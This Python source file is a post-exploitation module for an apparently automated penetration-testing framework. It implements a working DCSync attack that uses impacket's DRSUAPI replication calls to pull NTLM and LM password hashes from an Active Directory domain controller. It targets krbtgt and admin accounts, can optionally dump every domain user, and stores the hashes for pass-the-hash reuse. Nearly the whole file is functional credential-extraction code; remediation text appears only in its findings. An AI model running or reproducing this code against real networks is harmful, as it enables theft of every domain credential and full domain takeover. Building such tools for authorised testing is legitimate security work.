"""DCSync credential extraction via DRSUAPI replication.

Uses the Directory Replication Service (DRS) Remote Protocol to replicate
credential material directly from a Domain Controller.  This is the same
mechanism that real DCs use to synchronize — an attacker with
*Replicating Directory Changes* + *Replicating Directory Changes All*
rights can pull NTLM hashes for any account without touching NTDS.dit.

Based on impacket's ``secretsdump.py`` DRSUAPI logic.  Requires domain
admin (or equivalent replication) privileges.
"""

from __future__ import annotations

import asyncio
import contextlib
import logging
from typing import TYPE_CHECKING, Any

from pacdoor.core.models import (
    Credential,
    CredentialType,
    Evidence,
    ExploitSafety,
    Finding,
    Phase,
    Severity,
)
from pacdoor.modules.base import BaseModule

if TYPE_CHECKING:
    from pacdoor.modules.base import ModuleContext

log = logging.getLogger(__name__)

# ── Lazy import helpers ────────────────────────────────────────────────

HAS_IMPACKET: bool | None = None


def _ensure_impacket() -> bool:
    """Try to import the impacket DRSUAPI modules; cache the result."""
    global HAS_IMPACKET  # noqa: PLW0603
    if HAS_IMPACKET is not None:
        return HAS_IMPACKET
    try:
        import impacket.dcerpc.v5.drsuapi  # type: ignore[import-untyped]  # noqa: F401
        import impacket.dcerpc.v5.transport  # type: ignore[import-untyped]  # noqa: F401
        import impacket.ntlm  # type: ignore[import-untyped]  # noqa: F401

        HAS_IMPACKET = True
    except ImportError:
        log.debug("impacket not installed — DCSync module unavailable")
        HAS_IMPACKET = False
    return HAS_IMPACKET


# ── Well-known GUIDs for replication ACL check ─────────────────────────

# DS-Replication-Get-Changes
_REPL_GET_CHANGES_GUID = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
# DS-Replication-Get-Changes-All
_REPL_GET_CHANGES_ALL_GUID = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"

# High-value account RIDs
_RID_ADMINISTRATOR = 500
_RID_KRBTGT = 502

# ── LDAP ACL verification (synchronous) ────────────────────────────────


def _check_replication_rights(
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    ntlm_hash: str | None = None,
) -> dict[str, bool]:
    """Query LDAP for replication ACEs on the domain root.

    Returns a dict indicating whether the authenticated account holds
    the two critical replication rights.
    """
    result = {"get_changes": False, "get_changes_all": False}
    try:
        import ldap3  # type: ignore[import-untyped]

        base_dn = ",".join(f"DC={p}" for p in domain.split("."))

        server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL)
        bind_dn = f"{domain}\\{username}"
        conn = ldap3.Connection(
            server, user=bind_dn, password=password,
            authentication=ldap3.NTLM, auto_bind=True,
            read_only=True, receive_timeout=30,
        )

        # Read nTSecurityDescriptor on the domain root.
        conn.search(
            search_base=base_dn,
            search_filter="(objectClass=domain)",
            search_scope=ldap3.BASE,
            attributes=["nTSecurityDescriptor"],
            controls=[("1.2.840.113556.1.4.801", True, b"\x30\x03\x02\x01\x07")],
        )

        if conn.entries:
            sd_raw = conn.entries[0].entry_raw_attribute("nTSecurityDescriptor")
            if sd_raw:
                sd_bytes = sd_raw[0] if isinstance(sd_raw, list) else sd_raw
                sd_hex = sd_bytes.hex().lower()
                # Check for the well-known control access right GUIDs.
                guid_get = _REPL_GET_CHANGES_GUID.replace("-", "")
                guid_all = _REPL_GET_CHANGES_ALL_GUID.replace("-", "")
                if guid_get in sd_hex:
                    result["get_changes"] = True
                if guid_all in sd_hex:
                    result["get_changes_all"] = True

        conn.unbind()
    except Exception as e:
        log.debug("Replication rights check failed: %s", e)

    return result


# ── DRSUAPI replication (synchronous) ──────────────────────────────────


def _drs_connect(
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    ntlm_hash: str | None = None,
) -> tuple[Any, Any] | None:
    """Establish a DRSUAPI session.  Returns (dce, drs_handle) or None."""
    try:
        from impacket.dcerpc.v5 import drsuapi, transport  # type: ignore[import-untyped]

        string_binding = rf"ncacn_np:{dc_ip}[\pipe\drsuapi]"
        rpc_transport = transport.DCERPCTransportFactory(string_binding)
        rpc_transport.set_credentials(
            username, password, domain,
            lmhash=ntlm_hash.split(":")[0] if ntlm_hash and ":" in ntlm_hash else "",
            nthash=ntlm_hash.split(":")[-1] if ntlm_hash else "",
        )
        rpc_transport.set_connect_timeout(30)

        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

        # DRSBind
        request = drsuapi.DRSBind()
        request["puuidClientDsa"] = drsuapi.NTDSAPI_CLIENT_GUID
        drs_extensions_int = drsuapi.DRS_EXTENSIONS_INT()
        drs_extensions_int["cb"] = len(drs_extensions_int)
        drs_extensions_int["dwFlags"] = (
            drsuapi.DRS_EXT_GETCHGREQ_V6
            | drsuapi.DRS_EXT_GETCHGREPLY_V6
            | drsuapi.DRS_EXT_STRONG_ENCRYPTION
        )
        request["pextClient"]["cb"] = len(drs_extensions_int)
        request["pextClient"]["rgb"] = list(drs_extensions_int.getData())

        resp = dce.request(request)
        drs_handle = resp["phDrs"]

        return dce, drs_handle
    except Exception as e:
        log.debug("DRSBind to %s failed: %s", dc_ip, e)
        return None


def _drs_crack_name(
    dce: Any,
    drs_handle: Any,
    domain: str,
    account_name: str,
) -> str | None:
    """Resolve an account name to its DSNAME (distinguished name) via DRSCrackNames.

    Returns the DN string, or None on failure.
    """
    try:
        from impacket.dcerpc.v5 import drsuapi  # type: ignore[import-untyped]

        request = drsuapi.DRSCrackNames()
        request["hDrs"] = drs_handle
        request["dwInVersion"] = 1
        request["pmsgIn"]["tag"] = 1
        request["pmsgIn"]["V1"]["CodePage"] = 0
        request["pmsgIn"]["V1"]["LocaleId"] = 0
        request["pmsgIn"]["V1"]["dwFlags"] = 0
        request["pmsgIn"]["V1"]["formatOffered"] = (
            drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN
        )
        request["pmsgIn"]["V1"]["formatDesired"] = drsuapi.DS_FQDN_1779_NAME
        request["pmsgIn"]["V1"]["cNames"] = 1
        request["pmsgIn"]["V1"]["rpNames"].append(account_name)

        resp = dce.request(request)
        items = resp["pmsgOut"]["V1"]["pResult"]["rItems"]
        if items[0]["status"] == 0:
            return items[0]["pName"]
    except Exception as e:
        log.debug("DRSCrackNames failed for %s: %s", account_name, e)

    return None


def _drs_get_nc_changes(
    dce: Any,
    drs_handle: Any,
    user_dn: str,
) -> dict[str, str] | None:
    """Replicate a single object via DRSGetNCChanges and extract the NTLM hash.

    Returns {"username": ..., "nt_hash": ..., "lm_hash": ...} or None.
    """
    try:
        from impacket.dcerpc.v5 import drsuapi  # type: ignore[import-untyped]

        request = drsuapi.DRSGetNCChanges()
        request["hDrs"] = drs_handle
        request["dwInVersion"] = 8
        request["pmsgIn"]["tag"] = 8
        request["pmsgIn"]["V8"]["uuidDsaObjDest"] = drsuapi.NTDSAPI_CLIENT_GUID
        request["pmsgIn"]["V8"]["uuidInvocIdSrc"] = drsuapi.NTDSAPI_CLIENT_GUID

        dsname = drsuapi.DSNAME()
        dsname["SidLen"] = 0
        dsname["Guid"] = b"\x00" * 16
        dsname["StringName"] = (user_dn + "\x00")
        dsname["structLen"] = len(dsname.getData())
        dsname["NameLen"] = len(user_dn)

        request["pmsgIn"]["V8"]["pNC"] = dsname
        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighObjUpdate"] = 0
        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighPropUpdate"] = 0
        request["pmsgIn"]["V8"]["pUpToDateVecDest"] = b"\x00" * 32
        request["pmsgIn"]["V8"]["ulFlags"] = drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        request["pmsgIn"]["V8"]["cMaxObjects"] = 1
        request["pmsgIn"]["V8"]["cMaxBytes"] = 0
        request["pmsgIn"]["V8"]["ulExtendedOp"] = drsuapi.EXOP_REPL_OBJ
        request["pmsgIn"]["V8"]["pPartialAttrSet"] = _build_partial_attr_set()

        resp = dce.request(request)

        return _parse_replication_response(resp)
    except Exception as e:
        log.debug("DRSGetNCChanges failed for %s: %s", user_dn, e)
        return None


def _build_partial_attr_set() -> Any:
    """Build a PARTIAL_ATTR_VECTOR_V1_EXT requesting hash-related attributes."""
    from impacket.dcerpc.v5 import drsuapi  # type: ignore[import-untyped]

    # Attribute IDs for credential data:
    #   unicodePwd (NTLM hash)      = 0x00090094
    #   dBCSPwd    (LM hash)        = 0x00090090
    #   sAMAccountName              = 0x000904E8
    #   userPrincipalName           = 0x00090532
    #   supplementalCredentials     = 0x0009054E
    #   userAccountControl          = 0x00090008
    attr_ids = [
        0x00090094,  # unicodePwd
        0x00090090,  # dBCSPwd
        0x000904E8,  # sAMAccountName
        0x00090532,  # userPrincipalName
        0x0009054E,  # supplementalCredentials
        0x00090008,  # userAccountControl
    ]

    attrs = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
    attrs["dwVersion"] = 1
    attrs["V1"]["cAttrs"] = len(attr_ids)
    for attr_id in attr_ids:
        attr = drsuapi.ATTRTYP()
        attr["attrTyp"] = attr_id
        attrs["V1"]["rgPartialAttr"].append(attr)

    return attrs


def _parse_replication_response(resp: Any) -> dict[str, str] | None:
    """Extract sAMAccountName and NTLM hashes from the DRSGetNCChanges response."""
    try:
        ctr = resp["pmsgOut"]["V6"]["pObjects"]["Entinf"]["AttrBlock"]
        username = ""
        nt_hash = ""
        lm_hash = "aad3b435b51404ee"  # empty LM

        for attr in ctr["pAttr"]:
            attr_type = attr["attrTyp"]
            values = attr["AttrVal"]["pAVal"]
            if not values:
                continue
            raw = bytes(values[0]["pVal"])

            if attr_type == 0x000904E8:  # sAMAccountName
                username = raw.decode("utf-16-le", errors="replace").rstrip("\x00")
            elif attr_type == 0x00090094:  # unicodePwd (NT hash)
                nt_hash = raw.hex()
            elif attr_type == 0x00090090:  # dBCSPwd (LM hash)
                lm_hash = raw.hex()

        if username and nt_hash:
            return {"username": username, "nt_hash": nt_hash, "lm_hash": lm_hash}
    except Exception as e:
        log.debug("Failed to parse replication response: %s", e)

    return None


def _drs_replicate_account(
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    target_account: str,
    ntlm_hash: str | None = None,
) -> dict[str, str] | None:
    """Full DCSync pipeline for a single account: connect -> crack -> replicate.

    Returns {"username": ..., "nt_hash": ..., "lm_hash": ...} or None.
    """
    session = _drs_connect(dc_ip, domain, username, password, ntlm_hash)
    if session is None:
        return None

    dce, drs_handle = session
    try:
        user_dn = _drs_crack_name(dce, drs_handle, domain, target_account)
        if user_dn is None:
            return None
        return _drs_get_nc_changes(dce, drs_handle, user_dn)
    finally:
        with contextlib.suppress(Exception):
            dce.disconnect()


def _drs_replicate_all(
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    ntlm_hash: str | None = None,
    max_accounts: int = 5000,
) -> list[dict[str, str]]:
    """Full-domain DCSync: replicate all user objects.

    This enumerates domain users via LDAP, then replicates each one.
    Returns a list of {"username": ..., "nt_hash": ..., "lm_hash": ...}.
    """
    results: list[dict[str, str]] = []
    try:
        import ldap3  # type: ignore[import-untyped]

        base_dn = ",".join(f"DC={p}" for p in domain.split("."))
        server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL)
        bind_dn = f"{domain}\\{username}"
        conn = ldap3.Connection(
            server, user=bind_dn, password=password,
            authentication=ldap3.NTLM, auto_bind=True,
            read_only=True, receive_timeout=30,
        )

        conn.search(
            search_base=base_dn,
            search_filter="(&(objectClass=user)(objectCategory=person))",
            search_scope=ldap3.SUBTREE,
            attributes=["sAMAccountName"],
            paged_size=500,
            size_limit=max_accounts,
        )

        accounts = []
        for entry in conn.entries:
            sam = getattr(entry, "sAMAccountName", None)
            if sam and hasattr(sam, "value") and sam.value:
                accounts.append(str(sam.value))

        conn.unbind()
    except Exception as e:
        log.debug("LDAP user enumeration for full DCSync failed: %s", e)
        return results

    session = _drs_connect(dc_ip, domain, username, password, ntlm_hash)
    if session is None:
        return results

    dce, drs_handle = session
    try:
        for account in accounts[:max_accounts]:
            user_dn = _drs_crack_name(dce, drs_handle, domain, account)
            if user_dn is None:
                continue
            entry = _drs_get_nc_changes(dce, drs_handle, user_dn)
            if entry is not None:
                results.append(entry)
    finally:
        with contextlib.suppress(Exception):
            dce.disconnect()

    return results


# ── Module ─────────────────────────────────────────────────────────────


class DCSyncModule(BaseModule):
    """DCSync credential extraction via DRSUAPI replication.

    Replicates NTLM hashes for high-value domain accounts (krbtgt,
    Domain Admins, Enterprise Admins, RID-500 Administrator) using the
    Directory Replication Service protocol.  Optionally performs a full
    domain dump when running under an aggressive engagement profile.
    """

    name = "post.dcsync"
    description = "Extract domain credentials via DCSync (DRSUAPI replication)"
    phase = Phase.POST_EXPLOIT
    attack_technique_ids = ["T1003.006"]
    required_facts = ["credential.admin"]
    produced_facts = ["credential.admin"]
    safety = ExploitSafety.DANGEROUS

    async def check(self, ctx: ModuleContext) -> bool:
        """Verify impacket is available and required facts exist."""
        if not _ensure_impacket():
            log.debug("impacket not installed — DCSync unavailable")
            return False
        return await super().check(ctx)

    async def run(self, ctx: ModuleContext) -> list[Finding]:
        findings: list[Finding] = []

        if not _ensure_impacket():
            return findings

        # ── Resolve admin credential ─────────────────────────────────
        admin_creds = await ctx.facts.get_all("credential.admin")
        if not admin_creds:
            return findings

        username: str | None = None
        password: str | None = None
        domain: str | None = None
        ntlm_hash: str | None = None

        for cred_fact in admin_creds:
            cred = cred_fact.value
            u = cred.username if hasattr(cred, "username") else str(cred.get("username", ""))
            p = cred.value if hasattr(cred, "value") else str(cred.get("value", ""))
            d = cred.domain if hasattr(cred, "domain") else str(cred.get("domain", ""))

            if not u or not d:
                continue

            # Handle NTLM-hash credentials (pass-the-hash).
            if hasattr(cred, "cred_type") and str(cred.cred_type) == "ntlm_hash" or isinstance(cred, dict) and cred.get("cred_type") == "ntlm_hash":
                ntlm_hash = p
                p = ""

            username = u
            password = p
            domain = d
            break

        if not username or not domain:
            log.debug("dcsync: no usable admin domain credential found")
            return findings

        # ── Resolve DC IP from domain.info or service.ldap facts ─────
        dc_ip: str | None = None
        dc_host_id: str | None = None

        domain_facts = await ctx.facts.get_all("domain.info")
        for dfact in domain_facts:
            dval = dfact.value
            ip = dval.get("dc_ip") if isinstance(dval, dict) else getattr(dval, "dc_ip", None)
            if ip:
                dc_ip = str(ip)
                dc_host_id = dfact.host_id
                break

        # Fallback: resolve from LDAP/Kerberos service facts.
        if dc_ip is None:
            for svc_type in ("service.ldap", "service.kerberos"):
                svc_facts = await ctx.facts.get_all(svc_type)
                for svc_fact in svc_facts:
                    if svc_fact.host_id:
                        resolved = await self.resolve_ip(ctx, svc_fact.host_id)
                        if resolved:
                            dc_ip = resolved
                            dc_host_id = svc_fact.host_id
                            break
                if dc_ip:
                    break

        if dc_ip is None:
            log.debug("dcsync: could not resolve DC IP")
            return findings

        # ── Phase 1: Verify replication rights ───────────────────────
        await ctx.rate_limiter.acquire()
        rights = await asyncio.to_thread(
            _check_replication_rights,
            dc_ip, domain, username, password or "", ntlm_hash,
        )

        if rights["get_changes"] and rights["get_changes_all"]:
            findings.append(Finding(
                title=f"Replication rights confirmed on DC {dc_ip}",
                description=(
                    f"Account {username}@{domain} holds both "
                    "DS-Replication-Get-Changes and "
                    "DS-Replication-Get-Changes-All rights on the domain "
                    f"root. DCSync is possible against {dc_ip}."
                ),
                severity=Severity.CRITICAL,
                host_id=dc_host_id,
                module_name=self.name,
                attack_technique_ids=self.attack_technique_ids,
                evidence=[
                    Evidence(kind="repl_rights", data=(
                        f"Account: {username}@{domain}\n"
                        f"DS-Replication-Get-Changes: {rights['get_changes']}\n"
                        f"DS-Replication-Get-Changes-All: {rights['get_changes_all']}"
                    )),
                ],
                remediation=(
                    "Restrict Replicating Directory Changes rights to only "
                    "Domain Controller accounts. Remove these rights from all "
                    "non-DC accounts. Monitor Event ID 4662 for DRS replication "
                    "requests from non-DC sources."
                ),
                verified=True,
            ))

            if ctx.db is not None:
                await ctx.db.insert_finding(findings[-1])

        # ── Phase 2: DCSync key accounts ─────────────────────────────
        key_accounts = ["krbtgt", "Administrator"]

        # Add Domain Admins and Enterprise Admins members from fact store.
        for ad_fact_type in ("ad.domain_admins", "ad.enterprise_admins"):
            members = await ctx.facts.get_values(ad_fact_type)
            for item in members:
                if isinstance(item, list):
                    for m in item:
                        cn = m.get("cn", "") if isinstance(m, dict) else str(m)
                        if cn and cn not in key_accounts:
                            key_accounts.append(cn)
                elif isinstance(item, dict):
                    cn = item.get("cn", "")
                    if cn and cn not in key_accounts:
                        key_accounts.append(cn)

        synced_count = 0
        for target_account in key_accounts:
            await ctx.rate_limiter.acquire()
            entry = await asyncio.to_thread(
                _drs_replicate_account,
                dc_ip, domain, username, password or "",
                target_account, ntlm_hash,
            )

            if entry is None:
                log.debug("dcsync: replication failed for %s", target_account)
                continue

            synced_count += 1
            is_krbtgt = target_account.lower() == "krbtgt"
            is_admin = (
                target_account.lower() == "administrator"
                or target_account in key_accounts[2:]  # DA/EA members
            )

            # Persist the credential.
            new_cred = Credential(
                host_id=dc_host_id,
                username=entry["username"],
                cred_type=CredentialType.NTLM_HASH,
                value=f"{entry['lm_hash']}:{entry['nt_hash']}",
                domain=domain,
                source_module=self.name,
                valid=True,
                admin=is_admin or is_krbtgt,
            )

            await ctx.facts.add(
                "credential.admin", new_cred, self.name,
                host_id=dc_host_id,
            )

            if ctx.db is not None:
                await ctx.db.insert_credential(new_cred)

            # Build the finding — evidence includes account name and hash
            # type but NOT the actual hash value for safety.
            severity = Severity.CRITICAL
            if is_krbtgt:
                title = f"DCSync: krbtgt hash extracted from {dc_ip}"
                desc = (
                    f"Replicated the krbtgt account NTLM hash from DC "
                    f"{dc_ip} via DCSync. The krbtgt hash enables Golden "
                    f"Ticket creation, granting unrestricted domain access "
                    f"with arbitrary lifetimes."
                )
            else:
                title = f"DCSync: {entry['username']} hash extracted from {dc_ip}"
                desc = (
                    f"Replicated the NTLM hash for {entry['username']}@"
                    f"{domain} from DC {dc_ip} via DCSync. This hash "
                    f"can be used for pass-the-hash authentication."
                )

            finding = Finding(
                title=title,
                description=desc,
                severity=severity,
                host_id=dc_host_id,
                module_name=self.name,
                attack_technique_ids=self.attack_technique_ids,
                evidence=[
                    Evidence(kind="dcsync_target", data=(
                        f"Account: {entry['username']}@{domain}\n"
                        f"Hash type: NTLM (LM:NT)\n"
                        f"Source DC: {dc_ip}\n"
                        f"Method: DRSUAPI DRSGetNCChanges"
                    )),
                ],
                remediation=(
                    "Restrict Replicating Directory Changes rights to Domain "
                    "Controller accounts only. Monitor DRS replication events "
                    "(Event ID 4662) for requests originating from non-DC "
                    "hosts. Deploy Microsoft ATA / Defender for Identity to "
                    "detect DCSync attacks. Rotate the krbtgt password twice "
                    "if compromised."
                ),
                verified=True,
            )
            findings.append(finding)

            if ctx.db is not None:
                await ctx.db.insert_finding(finding)

        # ── Phase 3: Full domain DCSync (aggressive profile only) ────
        aggressive = ctx.config.get("aggressive", False)
        if aggressive and synced_count > 0:
            await ctx.rate_limiter.acquire()
            all_entries = await asyncio.to_thread(
                _drs_replicate_all,
                dc_ip, domain, username, password or "", ntlm_hash,
            )

            for entry in all_entries:
                new_cred = Credential(
                    host_id=dc_host_id,
                    username=entry["username"],
                    cred_type=CredentialType.NTLM_HASH,
                    value=f"{entry['lm_hash']}:{entry['nt_hash']}",
                    domain=domain,
                    source_module=self.name,
                    valid=True,
                    admin=False,
                )

                await ctx.facts.add(
                    "credential.admin", new_cred, self.name,
                    host_id=dc_host_id,
                )

                if ctx.db is not None:
                    await ctx.db.insert_credential(new_cred)

            if all_entries:
                finding = Finding(
                    title=(
                        f"Full domain DCSync: {len(all_entries)} hashes "
                        f"extracted from {dc_ip}"
                    ),
                    description=(
                        f"Replicated NTLM hashes for {len(all_entries)} domain "
                        f"accounts from DC {dc_ip} via full-domain DCSync. "
                        f"This represents complete domain credential compromise."
                    ),
                    severity=Severity.CRITICAL,
                    host_id=dc_host_id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="full_dcsync", data=(
                            f"Accounts replicated: {len(all_entries)}\n"
                            f"Source DC: {dc_ip}\n"
                            f"Domain: {domain}\n"
                            f"Method: DRSUAPI DRSGetNCChanges (full domain)"
                        )),
                    ],
                    remediation=(
                        "This constitutes full domain compromise. Rotate ALL "
                        "user passwords. Rotate the krbtgt password twice. "
                        "Investigate the attack path that led to replication "
                        "rights and remediate. Restrict replication ACEs. "
                        "Deploy monitoring for Event ID 4662 (DRS replication)."
                    ),
                    verified=True,
                )
                findings.append(finding)

                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)

        return findings
